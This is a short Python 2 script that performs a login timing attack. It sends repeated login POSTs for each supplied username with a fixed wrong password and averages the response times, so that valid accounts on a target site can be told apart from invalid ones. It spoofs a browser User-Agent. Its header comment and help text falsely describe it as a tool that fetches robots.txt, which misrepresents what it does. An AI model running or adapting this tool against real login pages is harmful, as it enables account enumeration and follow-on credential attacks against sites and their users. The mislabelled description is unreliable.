#!/usr/bin/env python
# -*- coding: utf-8 -*-
## grabs the robots.txt for a domain

import sys, argparse
import requests

class timing_attack(object):
    def __init__(self, url, headers, port=80, ssl=None, verbose=False, debug=False, attempts=3):
        self.url = url
        self.port = 443 if ssl else port
        self.ssl = ssl
        self.verbose = verbose
        self.debug = debug
        self.headers = headers
        self.attempts = attempts

    def print_config(self):
        print "config -"
        print "port:",self.port
        print "ssl:",self.ssl
        print "verbose:",self.verbose

    def test_login(self, u, p):
        payload = {"userid":u,"password":p}
        r = requests.post(self.url, data=payload, headers=self.headers)
        d = r.elapsed.total_seconds()
        return d

    # returns a tuple of the average and an array of all results
    # sample size defaults to 10 requests
    def test(self, u):
        print "testing: " + u
        password = "aca37099d21618971dd37b21f58e8674"
        results = []
        for i in xrange(self.attempts):
            payload = {"userid":u,"password":password}
            r = requests.post(self.url, data=payload, headers=self.headers)
            if self.debug: print "-----\n",r.text
            results.append(r.elapsed.total_seconds())
        average = sum(results) / float(len(results))
        if self.verbose: print "average:",str(average)
        if self.verbose: print "results:",results
        return (average,results)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="This is a script that grabs robots.txt for a domain.")
    parser.add_argument("-p","--port", type=int, help="the webserver port")
    parser.add_argument("-s","--ssl", action="store_true", help="whether or not to use ssl")
    parser.add_argument("-v","--verbose", action="store_true", default=False, help="turn on verbose output")
    parser.add_argument("-d","--debug", action="store_true", default=False, help="turn on debug output (even more verbose)")
    parser.add_argument("-t","--test", type=str, help="a valid password (matching first username) to test login")
    parser.add_argument("-a","--attempts", type=int, help="the number of login attempts to sample")
    parser.add_argument("url", help="the URL to test")
    parser.add_argument("usernames", help="one or more valid usernames comma seperated")
    args = parser.parse_args()

    url = args.url
    port = args.port
    test_password = args.test
    ssl = args.ssl
    verbose = args.verbose
    debug = args.debug
    attempts = args.attempts
    usernames = args.usernames.split(",")
    headers = {'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:28.0) Gecko/20100101 Firefox/28.0',
                'Cookie':'cookieEnable=true;',
                'content-type':'application/x-www-form-urlencoded',
                'content-length':'33'}

    t = timing_attack(url, headers, port, ssl, verbose, debug, attempts)

    if verbose: t.print_config()
    if test_password: print "testing valid login", t.test_login(usernames[0],test_password)

    results = {}
    for u in usernames:
        results[u] = t.test(u)

    print "results:"
    for r in results.keys():
        print r + " : " + str(results[r][0])
